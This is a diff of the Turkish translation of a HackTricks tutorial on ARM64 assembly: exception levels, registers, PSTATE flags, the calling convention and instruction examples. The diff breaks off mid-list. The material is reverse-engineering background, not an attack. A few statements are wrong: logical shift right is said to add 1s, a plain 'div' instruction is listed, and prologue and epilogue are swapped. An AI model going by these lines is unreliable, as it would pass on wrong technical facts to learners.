@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan Kahramana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong>!</summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
@@ -16,13 +16,13 @@ HackTricks'i desteklemenin diğer yolları:
 
 ## **İstisna Seviyeleri - EL (ARM64v8)**
 
-ARMv8 mimarisinde, İstisna Seviyeleri (EL'ler) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört istisna seviyesi bulunmaktadır ve her biri farklı bir amaca hizmet etmektedir:
+ARMv8 mimarisinde, ayrıcalık seviyeleri olarak bilinen İstisna Seviyeleri (EL'ler), yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar dört istisna seviyesi bulunmaktadır, her biri farklı bir amaca hizmet etmektedir:
 
 1. **EL0 - Kullanıcı Modu**:
 * Bu en az ayrıcalıklı seviyedir ve düzenli uygulama kodlarını yürütmek için kullanılır.
-* EL0'da çalışan uygulamalar birbirinden ve sistem yazılımından izole edilir, bu da güvenliği ve kararlılığı artırır.
+* EL0'da çalışan uygulamalar birbirinden ve sistem yazılımından izole edilir, böylece güvenlik ve kararlılık artar.
 2. **EL1 - İşletim Sistemi Çekirdek Modu**:
-* Çoğu işletim sistemi çekirdekleri bu seviyede çalışır.
+* Çoğu işletim sistemi çekirdeği bu seviyede çalışır.
 * EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir, ancak sistem bütünlüğünü sağlamak için bazı kısıtlamalar vardır.
 3. **EL2 - Hipervizör Modu**:
 * Bu seviye sanallaştırma için kullanılır. EL2'de çalışan bir hipervizör, aynı fiziksel donanım üzerinde çalışan birden fazla işletim sistemini (her biri kendi EL1'inde) yönetebilir.
@@ -31,29 +31,29 @@ ARMv8 mimarisinde, İstisna Seviyeleri (EL'ler) olarak bilinen yürütme seviyel
 * Bu en ayrıcalıklı seviyedir ve genellikle güvenli önyükleme ve güvenilir yürütme ortamları için kullanılır.
 * EL3, güvenli ve güvensiz durumlar arasındaki erişimleri yönetebilir ve kontrol edebilir (güvenli önyükleme, güvenilir işletim sistemi vb.).
 
-Bu seviyelerin kullanımı, sistemdeki farklı yönleri yönetmek için yapılandırılmış ve güvenli bir şekilde izin verir, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımlarına kadar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili bir şekilde izole etmeye yardımcı olarak sistem güvenliğini ve sağlamlığını artırır.
+Bu seviyelerin kullanımı, sistemdeki farklı yönleri yönetmek için yapılandırılmış ve güvenli bir şekilde izin verir. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili bir şekilde izole etmeye yardımcı olarak sistem güvenliğini ve sağlamlığını artırır.
 
 ## **Registerlar (ARM64v8)**
 
-ARM64'ün **31 genel amaçlı registerı** bulunmaktadır, `x0` ile `x30` arasında etiketlenmiştir. Her biri **64-bit** (8-byte) bir değer saklayabilir. Yalnızca 32-bit değerler gerektiren işlemler için, aynı registerlar `w0` ile `w30` isimleri kullanılarak 32-bit modunda erişilebilir.
+ARM64'ün **31 genel amaçlı registerı** bulunmaktadır, `x0` ile `x30` arasında etiketlenmiştir. Her biri **64-bit** (8-byte) bir değer saklayabilir. Yalnızca 32-bit değerler gerektiren işlemler için aynı registerlar, `w0` ile `w30` adları kullanılarak 32-bit modunda erişilebilir.
 
-1. **`x0`** ile **`x7`** - Bu genellikle geçici registerlar olarak ve alt programlara parametre geçirmek için kullanılır.
+1. **`x0`** ile **`x7`** - Bu genellikle geçici registerlar olarak ve alt programlara parametre geçirme amaçlı kullanılır.
 * **`x0`** ayrıca bir fonksiyonun dönüş verisini taşır.
 2. **`x8`** - Linux çekirdeğinde, `x8` `svc` komutu için sistem çağrı numarası olarak kullanılır. **macOS'ta ise x16 kullanılır!**
 3. **`x9`** ile **`x15`** - Daha fazla geçici registerlar, genellikle yerel değişkenler için kullanılır.
-4. **`x16`** ve **`x17` - **İçsel-prosedürel Çağrı Registerları**. Hemen değerler için geçici registerlar. Ayrıca dolaylı fonksiyon çağrıları ve PLT (Procedure Linkage Table) kısayolları için kullanılır.
+4. **`x16`** ve **`x17`** - **İçsel-prosedürel Çağrı Registerları**. Hemen değerler için geçici registerlar. Ayrıca dolaylı fonksiyon çağrıları ve PLT (Procedure Linkage Table) kısayolları için kullanılır.
 * **`x16`**, **macOS**'ta **`svc`** komutu için **sistem çağrı numarası** olarak kullanılır.
-5. **`x18`** - **Platform registerı**. Genel amaçlı bir register olarak kullanılabilir, ancak bazı platformlarda bu register platforma özgü amaçlar için ayrılmıştır: Windows'ta mevcut iş parçacığı ortam bloğuna işaretçi veya linux çekirdeğinde mevcut **yürütülen görev yapısına işaret etmek için**.
-6. **`x19`** ile **`x28`** - Bunlar çağrıyı yapanın değerlerini koruması gereken çağrılan registerlardır, bu nedenle bunlar yığında saklanır ve çağrıya geri dönmeden önce geri alınır.
-7. **`x29`** - Yığın çerçevesini takip etmek için **çerçeve işaretçisi**. Bir işlev çağrıldığında yeni bir yığın çerçevesi oluşturulduğunda, **`x29`** registerı yığında saklanır ve yeni çerçeve işaretçi adresi (**`sp`** adresi) bu registerda saklanır.
-* Bu register genel amaçlı bir register olarak da kullanılabilir, ancak genellikle **yerel değişkenlere referans olarak** kullanılır.
-8. **`x30`** veya **`lr`**- **Bağlantı registerı**. Bir `BL` (Bağlantılı Dal) veya `BLR` (Register ile Bağlantılı Dal) komutu yürütüldüğünde **dönüş adresini** tutar ve bu registerda **`pc`** değerini saklayarak.
+5. **`x18`** - **Platform registerı**. Genel amaçlı bir register olarak kullanılabilir, ancak bazı platformlarda bu register platforma özgü amaçlar için ayrılmıştır: Windows'ta mevcut iş parçacığı ortam bloğuna işaretçi veya linux çekirdeğinde şu anda **çalışan görev yapısına işaret etmek için**.
+6. **`x19`** ile **`x28`** - Bunlar çağrıyı yapanın değerlerini koruması gereken çağrı saklanmış registerlardır, bu nedenle bunlar yığında saklanır ve çağrıya geri dönmeden önce kurtarılır.
+7. **`x29`** - Yığın çerçevesini takip etmek için **çerçeve işaretçisi**. Bir işlev çağrıldığında yeni bir yığın çerçevesi oluşturulduğunda, **`x29`** registerı yığında **saklanır** ve yeni çerçeve işaretçi adresi (**`sp`** adresi) bu registerda **saklanır**.
+* Bu register genel amaçlı bir register olarak da kullanılabilir, ancak genellikle **yerel değişkenlere referans** olarak kullanılır.
+8. **`x30`** veya **`lr`**- **Bağlantı registerı**. Bir `BL` (Branch with Link) veya `BLR` (Register ile Bağlantılı Dal) komutu yürütüldüğünde **dönüş adresini** tutar ve bu registerda **`pc`** değerini saklar.
 * Diğer registerlar gibi kullanılabilir.
-* Eğer mevcut fonksiyon yeni bir fonksiyon çağıracak ve dolayısıyla `lr`'yi üzerine yazacaksa, başlangıçta bunu yığında saklar, bu epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi sakla, alan oluştur ve yeni `fp` al) ve sonunda geri alır, bu prolog (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi geri al ve dön).
+* Eğer mevcut fonksiyon yeni bir fonksiyon çağıracak ve dolayısıyla `lr`'yi üzerine yazacaksa, başlangıçta bunu yığında saklar, bu epilog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi sakla, alan oluştur ve yeni `fp` al) ve sonunda kurtarır, bu prolog (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi kurtar ve geri dön).
 9. **`sp`** - **Yığın işaretçisi**, yığının en üstünü takip etmek için kullanılır.
-* **`sp`** değeri her zaman en az bir **quadword** **hizalamasında** tutulmalıdır aksi takdirde bir hizalama istisnası oluşabilir.
-10. **`pc`** - **Program sayacı**, bir sonraki komutu işaret eder. Bu register yalnızca istisna oluşturulduğunda, istisna dönüşlerinde ve dallanmalarda güncellenebilir. Bu registerı okuyabilen tek sıradan komutlar, **`pc`** adresini **`lr`**'ye (Bağlantı Registerı) saklamak için bağlantılı dal komutlarıdır.
-11. **`xzr`** - **Sıfır registerı**. 32-bit register formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca almak için kullanılabilir (yaygın işlem) veya **`subs`** kullanarak karşılaştırmalar yapmak için kullanılabilir, örneğin **`subs XZR, Xn, #10`** sonuç verisini hiçbir yere saklamadan (**`xzr`**'ye) saklar.
+* **`sp`** değeri her zaman en az bir **quadword hizalamasında** tutulmalıdır aksi takdirde bir hizalama istisnası oluşabilir.
+10. **`pc`** - **Program sayacı**, bir sonraki komutu işaret eder. Bu register yalnızca istisna oluşturma, istisna dönüşleri ve dallanmalar aracılığıyla güncellenebilir. Bu registerı okuyabilen tek sıradan komutlar, **`pc`** adresini **`lr`**'ye (Bağlantı Registerı) saklamak için bağlantılı dal komutlarıdır.
+11. **`xzr`** - **Sıfır registerı**. 32-bit register formunda **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca almak için (yaygın işlem) veya **`subs`** kullanarak karşılaştırmalar yapmak için kullanılabilir, örneğin **`subs XZR, Xn, #10`** sonucu veriyi hiçbir yere saklamadan (**`xzr`**'ye) saklar.
 
 **`Wn`** registerları, **`Xn`** registerının 32-bit versiyonudur.
 
@@ -62,21 +62,21 @@ ARM64'ün **31 genel amaçlı registerı** bulunmaktadır, `x0` ile `x30` arası
 Ayrıca, optimize edilmiş tek komutla çoklu veri (SIMD) işlemleri ve kayan nokta aritmetiği yapmak için kullanılabilen başka **32 adet 128-bit uzunluğunda register** bulunmaktadır. Bunlar Vn registerları olarak adlandırılır, ancak aynı zamanda **64**-bit, **32**-bit, **16**-bit ve **8**-bit olarak da çalışabilir ve o zaman **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.
 ### Sistem Kayıtları
 
-**Yüzlerce sistem kaydı**, ayrıca özel amaçlı kayıtlar (SPR'ler) olarak adlandırılan, **işlemcilerin** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
-Bu kayıtlar yalnızca özel **`mrs`** ve **`msr`** komutlarını kullanarak okunabilir veya ayarlanabilir.
+**Yüzlerce sistem kaydı** bulunmaktadır, ayrıca özel amaçlı kayıtlar (SPR'ler) olarak da adlandırılan bu kayıtlar, **işlemcilerin** davranışını **izlemek** ve **kontrol etmek** için kullanılır.\
+Bu kayıtlar yalnızca özel **`mrs`** ve **`msr`** komutları kullanılarak okunabilir veya ayarlanabilir.
 
-Özel kayıtlar **`TPIDR_EL0`** ve **`TPIDDR_EL0`** genellikle tersine mühendislik yapılırken bulunur. `EL0` eki, kaydın hangi istisnadan erişilebileceğini belirtir (bu durumda EL0, normal programların çalıştığı düzenli istisna (ayrıcalık) seviyesidir).\
-Genellikle bunlar bellek bölgesinin **iş parçacığı yerel depolama** alanının **taban adresini** saklamak için kullanılır. Genellikle birincisi EL0'da çalışan programlar için okunabilir ve yazılabilir, ancak ikincisi EL0'dan okunabilir ve EL1'den yazılabilir (çekirdek gibi).
+Özel kayıtlar **`TPIDR_EL0`** ve **`TPIDDR_EL0`** genellikle tersine mühendislik yapılırken bulunur. `EL0` eki, kaydın hangi istisnadan erişilebileceğini belirtir (bu durumda EL0, normal programların çalıştığı düzeydir).\
+Genellikle bunlar bellek bölgesinin **iş parçacığı yerel depolama** alanının **taban adresini saklamak** için kullanılır. Genellikle birinci EL0'da çalışan programlar için okunabilir ve yazılabilir, ancak ikincisi EL0'dan okunabilir ve EL1'den yazılabilir (çekirdek gibi).
 
 * `mrs x0, TPIDR_EL0 ; TPIDR_EL0'i x0'a oku`
 * `msr TPIDR_EL0, X0 ; x0'u TPIDR_EL0'e yaz`
 
 ### **PSTATE**
 
-**PSTATE**, işlemcinin işlem sona erdiğinde işlem durumunu kurtarmak için **işletim sistemi tarafından görülebilen** **`SPSR_ELx`** özel kaydına seri hale getirilmiş birkaç işlem bileşenini içerir, X tetiklenen istisna **izin seviyesi** olur (bu, istisna sona erdiğinde işlem durumunu kurtarmayı sağlar).\
-Bunlar erişilebilir alanlardır:
+**PSTATE**, işlemcinin **işletim sistemi tarafından görülebilen `SPSR_ELx`** özel kaydına seri hale getirilmiş birkaç işlem bileşenini içerir, X tetiklenen istisna **izin seviyesi** olup (bu, istisna sona erdiğinde işlem durumunu kurtarmayı sağlar).\
+Bu erişilebilir alanlar şunlardır:
 
-<figure><img src="../../../.gitbook/assets/image (1193).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>
 
 * **`N`**, **`Z`**, **`C`** ve **`V`** durum bayrakları:
 * **`N`**, işlemin negatif bir sonuç verdiğini gösterir
@@ -85,26 +85,26 @@ Bunlar erişilebilir alanlardır:
 * **`V`**, işlemin işaretli bir taşma verdiğini gösterir:
 * İki pozitif sayının toplamı negatif bir sonuç verir.
 * İki negatif sayının toplamı pozitif bir sonuç verir.
-* Çıkarma işleminde, büyük bir negatif sayıdan daha küçük bir pozitif sayı çıkarıldığında (veya tersi durumda) ve sonuç verilen bit boyutu aralığında temsil edilemiyorsa.
+* Çıkarma işleminde, büyük bir negatif sayıdan daha küçük bir pozitif sayı çıkarıldığında (veya tersi), ve sonuç verilen bit boyutu aralığında temsil edilemiyorsa.
 * Açıkçası işlemcinin işlemin işaretli olup olmadığını bilmediği için, işlemlerde C ve V'yi kontrol edecek ve taşıma işareti olup olmadığını belirtecektir.
 
 {% hint style="warning" %}
-Tüm komutlar bu bayrakları güncellemez. **`CMP`** veya **`TST`** gibi bazıları yapar, ve **`ADDS`** gibi s eki olan diğerleri de yapar.
+Tüm komutlar bu bayrakları güncellemez. **`CMP`** veya **`TST`** gibi bazıları yapar, ve **`ADDS`** gibi s takısına sahip olanlar da yapar.
 {% endhint %}
 
-* Mevcut **kayıt genişliği (`nRW`) bayrağı**: Bayrağın değeri 0 ise, program devam edildiğinde AArch64 yürütme durumunda çalışacaktır.
-* Mevcut **İstisna Seviyesi** (**`EL`**): EL0'da çalışan normal bir programın değeri 0 olacaktır
-* **Tek adımlama** bayrağı (**`SS`**): Hata ayıklama araçları tarafından tek adımlamak için SS bayrağını **`SPSR_ELx`** içinde 1 olarak ayarlayarak kullanılır. Program bir adım çalışacak ve tek adım istisnası verecektir.
-* **Yasadışı istisna** durumu bayrağı (**`IL`**): Ayrıcalıklı bir yazılımın geçersiz bir istisna seviyesi transferi gerçekleştirdiğinde işaretlenir, bu bayrak 1 olarak ayarlanır ve işlemci yasadışı bir durum istisnası tetikler.
+* Geçerli **kayıt genişliği (`nRW`)** bayrağı: Bayrak değeri 0 ise, program devam edildiğinde AArch64 yürütme durumunda çalışacaktır.
+* Geçerli **İstisna Düzeyi** (**`EL`**): EL0'da çalışan normal bir programın değeri 0 olacaktır
+* **Tek adımlama** bayrağı (**`SS`**): Hata ayıklamak için kullanılan tek adımlama bayrağı, SS bayrağını **`SPSR_ELx`** içinde 1 olarak ayarlayarak bir istisna oluşturur. Program bir adım çalışacak ve tek adımlama istisnası oluşturacaktır.
+* **Yasadışı istisna** durumu bayrağı (**`IL`**): Bu, ayrıcalıklı bir yazılımın geçersiz bir istisna düzeyi transferi gerçekleştirdiğinde işaretlenir, bu bayrak 1 olarak ayarlanır ve işlemci yasadışı bir durum istisnası oluşturur.
 * **`DAIF`** bayrakları: Bu bayraklar ayrıcalıklı bir programın belirli harici istisnaları seçici olarak maskelemesine izin verir.
 * **`A`** 1 ise **asenkron hatalar** tetikleneceği anlamına gelir. **`I`** harici donanım **Kesme İsteklerine** (IRQ'ler) yanıt vermek için yapılandırılır ve F **Hızlı Kesme İstekleri** (FIR'ler) ile ilgilidir.
-* **Yığın işaretçisi seçme** bayrakları (**`SPS`**): EL1 ve üstünde çalışan ayrıcalıklı programlar, kendi yığın işaretçi kayıtlarını ve kullanıcı modelini (örneğin `SP_EL1` ve `EL0` arasında) değiş tokuş yapabilir. Bu değişim, **`SPSel`** özel kaydına yazılarak gerçekleştirilir. Bu EL0'dan yapılamaz.
+* **Yığın işaretçisi seç** bayrakları (**`SPS`**): EL1 ve üstünde çalışan ayrıcalıklı programlar, kendi yığın işaretçi kaydını ve kullanıcı modelini (örneğin `SP_EL1` ve `EL0` arasında) değiş tokuş yapabilir. Bu değişim, **`SPSel`** özel kaydına yazılarak gerçekleştirilir. Bu EL0'dan yapılamaz.
 
 ## **Çağrı Sözleşmesi (ARM64v8)**
 
-ARM64 çağrı sözleşmesi, bir işlev için **ilk sekiz parametrenin** **`x0` ile `x7`** kayıtlarında geçirildiğini belirtir. **Ek** parametreler **yığın** üzerinde geçirilir. **Dönüş** değeri, kayıt **`x0`** içinde geri döndürülür, veya **128 bit uzunluğunda ise** ayrıca **`x1`** içinde de olabilir. **`x19`** ile **`x30`** ve **`sp`** kayıtları işlev çağrıları arasında **korunmalıdır**.
+ARM64 çağrı sözleşmesi, bir işlev için **ilk sekiz parametrenin** **`x0` ile `x7`** kayıtlarında geçirildiğini belirtir. **Ek** parametreler **yığın** üzerinde geçirilir. **Dönüş** değeri, **`x0`** kaydına geri döndürülür, veya **128 bit uzunluğunda ise** ayrıca **`x1`**'e de. **`x19`** ile **`x30`** ve **`sp`** kayıtları işlev çağrıları arasında **korunmalıdır**.
 
-Bir işlevi derleyici dilinde okurken, **işlev giriş ve çıkışını** arayın. **Giriş** genellikle **çerçeve işaretçisini (`x29`)** **kaydetmeyi**, yeni bir **çerçeve işaretçisi** kurmayı ve bir **yığın alanı tahsis etmeyi** içerir. **Çıkış** genellikle **kaydedilen çerçeve işaretçisini geri yüklemeyi** ve işlevden **dönmeyi** içerir.
+Bir işlevi montajda okurken, **işlev prologu ve epilogunu** arayın. **Prolog** genellikle **çerçeve işaretçisini (`x29`) kaydetmeyi**, yeni bir **çerçeve işaretçisi ayarlamayı** ve **yığın alanı tahsis etmeyi** içerir. **Epilog** genellikle **kaydedilen çerçeve işaretçisini geri yüklemeyi** ve **işlevden dönmeyi** içerir.
 
 ### Swift'te Çağrı Sözleşmesi
 
@@ -115,26 +115,26 @@ Swift'in kendi **çağrı sözleşmesi** [burada](https://github.com/apple/swift
 ARM64 komutları genellikle `opcode hedef, kaynak1, kaynak2` formatına sahiptir, burada **`opcode`** yapılacak işlemi belirtir (`add`, `sub`, `mov`, vb.), **`hedef`** sonucun depolanacağı hedef kayıt, ve **`kaynak1`** ve **`kaynak2`** kaynak kayıtlarıdır. Hemen kaynak kayıtlarının yerine anlık değerler de kullanılabilir.
 
 * **`mov`**: Bir değeri bir **kaynaktan** başka bir **kayda taşı**
-* Örnek: `mov x0, x1` — Bu, `x1` den `x0` a değeri taşır.
+* Örnek: `mov x0, x1` — Bu, `x1`'den `x0`'a değeri taşır.
 * **`ldr`**: Bir değeri **bellekten** bir **kayda yükle**
-* Örnek: `ldr x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan `x0` a bir değer yükler.
+* Örnek: `ldr x0, [x1]` — Bu, `x1` tarafından işaret edilen bellek konumundan `x0`'a bir değer yükler.
 * **Ofset modu**: Orin işaretçisini etkileyen bir ofset belirtilir, örneğin:
-* `ldr x2, [x1, #8]`, bu x2'ye x1 + 8'den değeri yükler
-* `ldr x2, [x0, x1, lsl #2]`, bu x2'ye x0 dizisinden, x1 (endeks) \* 4 pozisyonundaki bir nesneyi yükler
+* `ldr x2, [x1, #8]`, bu x1 + 8'den x2'ye değeri yükler
+* `ldr x2, [x0, x1, lsl #2]`, bu x0 dizisinden x1 (indeks) \* 4 pozisyonundaki nesneyi x2'ye yükler
 * **Ön-indeks modu**: Bu, hesaplamaları orijine uygular, sonucu alır ve yeni orijini orijine kaydeder.
-* `ldr x2, [x1, #8]!`, bu `x1 + 8` i `x2` ye yükler ve `x1 + 8` in sonucunu `x1` e kaydeder
-* `str lr, [sp, #-4]!`, Bağlantı kaydını sp'ye kaydeder ve sp kaydını günceller
-* **Sonrası-indeks modu**: Bu bir öncekine benzer ancak bellek adresine erişilir ve ardından ofset hesaplanır ve saklanır.
-* `ldr x0, [x1], #8`, `x1` i `x0` a yükler ve `x1` i `x1 + 8` ile günceller
+* `ldr x2, [x1, #8]!`, bu `x1 + 8`'i `x2`'ye yükler ve `x1`'e `x1 + 8`'in sonucunu kaydeder
+* `str lr, [sp, #-4]!`, bağlantı kaydını sp'ye kaydeder ve sp kaydını günceller
+* **Sonrası-indeks modu**: Bu bir öncekine benzer ancak bellek adresine erişilir ve ardından ofset hesaplanır ve kaydedilir.
+* `ldr x0, [x1], #8`, `x1`'i `x0`'a yükler ve x1'i `x1 + 8` ile günceller
 * **PC'ye göre adresleme**: Bu durumda yüklenecek adres, PC kaydına göre hesaplanır
 * `ldr x1, =_start`, Bu, `_start` sembolünün başladığı adresi x1'e yükler, mevcut PC'ye göre ilişkilendirilir.
-* **`str`**: Bir değeri bir **kaynaktan** **belleğe** **kaydet**
-* Örnek: `str x0, [x1]` — Bu, `x0` daki değeri `x1` tarafından işaret edilen bellek konumuna kaydeder.
-* **`ldp`**: **Çift Kayıt Yükle**. Bu komut **ardışık bellekten** iki kaydı yükler. Bellek adresi genellikle başka bir kayıttaki değere bir ofset ekleyerek oluşturulur.
-* Örnek: `ldp x0, x1, [x2]` — Bu, sırasıyla `x2` ve `x2 + 8` konumlarındaki bellekten `x0` ve `x1` i yükler.
-* **`stp`**: **Çift Kayıt Sakla**. Bu komut **ardışık belleğe** iki kaydı saklar. Bellek adresi genellikle başka bir kayıttaki değere bir ofset ekleyerek oluşturulur.
-* Örnek: `stp x0, x1, [sp]` — Bu, sırasıyla `sp` ve `sp + 8` konumlarındaki belleğe `x0` ve `x1` i saklar.
-* `stp x0, x1, [sp, #16]!` — Bu, sırasıyla `sp+16` ve `sp + 24` konumlarındaki belleğe `x0` ve `x1` i saklar ve `sp` yi `sp+16` ile günceller.
+* **`str`**: Bir değeri bir **kaynaktan** **belleğe** kaydet
+* Örnek: `str x0, [x1]` — Bu, `x0`'daki değeri `x1` tarafından işaret edilen bellek konumuna kaydeder.
+* **`ldp`**: **Çift Kayıt Yükle**. Bu komut **ardışık bellekten iki kaydı yükler**. Bellek adresi genellikle başka bir kayıttaki değere bir ofset ekleyerek oluşturulur.
+* Örnek: `ldp x0, x1, [x2]` — Bu, sırasıyla `x2` ve `x2 + 8` bellek konumlarından `x0` ve `x1`'i yükler.
+* **`stp`**: **Çift Kayıt Kaydet**. Bu komut **ardışık belleğe iki kaydı kaydeder**. Bellek adresi genellikle başka bir kayıttaki değere bir ofset ekleyerek oluşturulur.
+* Örnek: `stp x0, x1, [sp]` — Bu, sırasıyla `sp` ve `sp + 8` bellek konumlarına `x0` ve `x1`'i kaydeder.
+* `stp x0, x1, [sp, #16]!` — Bu, sırasıyla `sp+16` ve `sp + 24` bellek konumlarına `x0` ve `x1`'i kaydeder ve `sp`'yi `sp+16` ile günceller.
 * **`add`**: İki kaydın değerlerini ekler ve sonucu bir kayda kaydeder.
 * Sözdizimi: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
 * Xn1 -> Hedef
@@ -153,9 +153,9 @@ ARM64 komutları genellikle `opcode hedef, kaynak1, kaynak2` formatına sahiptir
 * **`div`**: Bir kaydırıcının değerini başka bir kaydırıcıya böler ve sonucu bir kaydırıcıda saklar.
 * Örnek: `div x0, x1, x2` — Bu, `x1`'deki değeri `x2`'ye böler ve sonucu `x0`'a kaydeder.
 * **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-* **Mantıksal sola kaydırma**: Diğer bitleri ileriye taşıyarak sona 0'lar ekler (n kez 2 ile çarpar)
-* **Mantıksal sağa kaydırma**: Diğer bitleri geriye taşıyarak başa 1'ler ekler (n kez 2'ye bölünür)
-* **Aritmetik sağa kaydırma**: **`lsr`** gibi, ancak en anlamlı bit 1 ise, 1'ler eklenir (n kez 2'ye bölünür)
+* **Mantıksal sola kaydırma**: Diğer bitleri ileriye doğru hareket ettirerek sona 0'lar ekler (n kez 2 ile çarpar)
+* **Mantıksal sağa kaydırma**: Diğer bitleri geriye doğru hareket ettirerek başa 1'ler ekler (n kez 2'ye bölünmüş şekilde işaretsiz)
+* **Aritmetik sağa kaydırma**: **`lsr`** gibi, ancak en anlamlı bit 1 ise, 1'ler eklenir (işaretli n kez 2'ye bölünmüş şekilde)
 * **Sağa döndürme**: **`lsr`** gibi, ancak sağdan kaldırılan her şey sola eklenir
 * **Uzantılı Sağa Döndürme**: **`ror`** gibi, ancak taşıma bayrağı "en anlamlı bit" olarak kabul edilir. Bu nedenle, taşıma bayrağı 31. bit'e ve kaldırılan bit taşıma bayrağına taşınır.
 * **`bfm`**: **Bit Alanı Taşıma**, bu işlemler bir değerden belirli bitleri kopyalar ve bunları belirli pozisyonlara yerleştirir. **`#s`** en sol bit konumunu belirtir ve **`#r`** sağa döndürme miktarını belirtir.
@@ -169,48 +169,48 @@ ARM64 komutları genellikle `opcode hedef, kaynak1, kaynak2` formatına sahiptir
 * **`SBFX X1, X2, #3, #4`** X2'den 3. bit başlayarak 4 bit çıkarır, işareti genişletir ve sonucu X1'e yerleştirir
 * **`UBFIZ X1, X2, #3, #4`** X2'den 4 bit sıfır genişletir ve 3. bit pozisyonundan başlayarak X1'e ekler, sağdaki bitleri sıfırlar
 * **`UBFX X1, X2, #3, #4`** X2'den 3. bit başlayarak 4 bit çıkarır ve sıfır genişletilmiş sonucu X1'e yerleştirir.
-* **İşareti Genişlet X'e:** Bir değerin işaretini genişletir (veya işaretsiz sürümde sadece 0'ları ekler) ve işlemler yapabilmek için:
+* **X'e İşareti Genişlet**: Bir değerin işaretini genişletir (veya işaretsiz sürümde sadece 0'ları ekler) işlemler yapabilmek için:
 * **`SXTB X1, W2`** Bir baytın işaretini genişletir **W2'den X1'e** (`W2`, `X2`'nin yarısıdır) 64 biti doldurmak için
 * **`SXTH X1, W2`** 16 bitlik bir sayının işaretini genişletir **W2'den X1'e** 64 biti doldurmak için
 * **`SXTW X1, W2`** Bir baytın işaretini genişletir **W2'den X1'e** 64 biti doldurmak için
 * **`UXTB X1, W2`** Bir bayta 0'lar ekler (işaretsiz) **W2'den X1'e** 64 biti doldurmak için
-* **`extr`:** Belirtilen **çift kaydırıcıdan bitleri çıkarır ve birleştirir**.
-* Örnek: `EXTR W3, W2, W1, #3` Bu, **W1+W2'yi** birleştirir ve **W2'nin 3. bitinden W1'in 3. bitine kadar olan kısmı alır ve W3'e kaydeder.
+* **`extr`:** Belirtilen **çift kaydırıcıdan** bitleri çıkarır.
+* Örnek: `EXTR W3, W2, W1, #3` Bu, **W1+W2'yi birleştirir** ve **W2'nin 3. bitinden W1'in 3. bitine kadar olan kısmı alır** ve W3'e kaydeder.
 * **`cmp`**: İki kaydırıcıyı karşılaştırır ve koşul bayraklarını ayarlar. `subs`'nin bir **takma adı** olup hedef kaydırıcıyı sıfır kaydırıcıya ayarlar. `m == n`'yi bilmek için kullanışlıdır.
 * Aynı **sözdizimini** destekler
 * Örnek: `cmp x0, x1` — Bu, `x0` ve `x1` değerlerini karşılaştırır ve koşul bayraklarını buna göre ayarlar.
 * **`cmn`**: **Negatif karşılaştırma** işlemi. Bu durumda, `adds`'nin bir **takma adı** olup aynı sözdizimini destekler. `m == -n`'yi bilmek için kullanışlıdır.
 * **`ccmp`**: Koşullu karşılaştırma, önceki bir karşılaştırmanın doğru olması durumunda gerçekleştirilen ve özellikle nzcv bitlerini belirleyen bir karşılaştırmadır.
-* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise, func'a atla
-* Bu, çünkü **`ccmp`** yalnızca önceki `cmp` bir `NE` ise gerçekleştirilecek, değilse `nzcv` bitleri 0 olarak ayarlanacaktır (`blt` karşılaştırmasını karşılamayacaktır).
+* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> eğer x1 != x2 ve x3 < x4 ise, _func'a atla
+* Bu, çünkü **`ccmp`** yalnızca önceki `cmp` bir `NE` ise gerçekleştirilecek, değilse bitler `nzcv` 0 olarak ayarlanacaktır (`blt` karşılaştırmasını karşılamayacaktır).
 * Bu aynı zamanda `ccmn` olarak da kullanılabilir (aynı ancak negatif, `cmp` vs `cmn` gibi).
-* **`tst`**: Karşılaştırmanın değerlerinden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu herhangi bir yere kaydetmeden ANDS gibi çalışır). Bir kaydırıcıyı bir değerle kontrol etmek ve belirtilen değerde gösterilen kaydırıcının herhangi bir bitinin 1 olup olmadığını kontrol etmek için kullanışlıdır.
-* Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
-* **`teq`**: Sonucu atlayarak XOR işlemi yapar
+* **`tst`**: Karşılaştırmanın değerlerinden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu herhangi bir yere kaydetmeden ve işlem yapmadan çalışır). Bir kaydırıcıyı bir değerle kontrol etmek ve belirtilen değerde gösterilen kaydırıcının herhangi bir bitinin 1 olup olmadığını kontrol etmek için kullanışlıdır.
+* Örnek: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol edin
+* **`teq`**: Sonucu atmadan XOR işlemi
 * **`b`**: Koşulsuz Atlama
-* Örnek: `b myFunction`&#x20;
